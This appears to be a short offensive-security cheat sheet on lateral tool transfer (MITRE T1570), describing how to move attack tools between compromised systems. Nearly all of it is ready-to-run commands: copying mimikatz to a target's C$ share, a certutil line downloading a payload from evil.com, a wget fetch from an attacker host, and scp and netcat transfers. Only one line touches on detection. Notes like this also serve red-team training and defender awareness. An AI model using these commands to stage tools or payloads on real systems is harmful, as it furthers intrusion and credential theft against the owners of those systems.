---
title: Lateral Tool Transfer
tags: [lateral-movement, file-transfer, scp, smb, certutil]
description: Moving tools and payloads between compromised systems.
date: 2024-01-02
---

# Lateral Tool Transfer (T1570)

Getting your toolkit to the beachhead.

## 1. SMB Copy
Mounting the C$ share.
```bash
copy C:\Tools\mimikatz.exe \\Target\C$\Windows\Temp\mimi.exe
```

## 2. Certutil (Windows)
Built-in certificate utility that can download files.
```bash
certutil -urlcache -split -f http://evil.com/payload.exe C:\Temp\payload.exe
```
*Detection*: Highly monitored.

## 3. Linux Methods
- **SCP**: `scp -i key tool.sh user@target:/tmp/`
- **Wget/Curl**: `wget http://attacker/tool`
- **Netcat**:
  - Receiver: `nc -l -p 4444 > tool`
  - Sender: `nc target 4444 < tool`
